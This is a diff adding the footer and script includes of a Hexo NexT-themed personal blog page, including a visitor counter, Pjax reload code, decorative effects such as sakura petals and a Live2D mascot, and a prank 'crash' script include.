+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">271k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:06</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共72.4k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
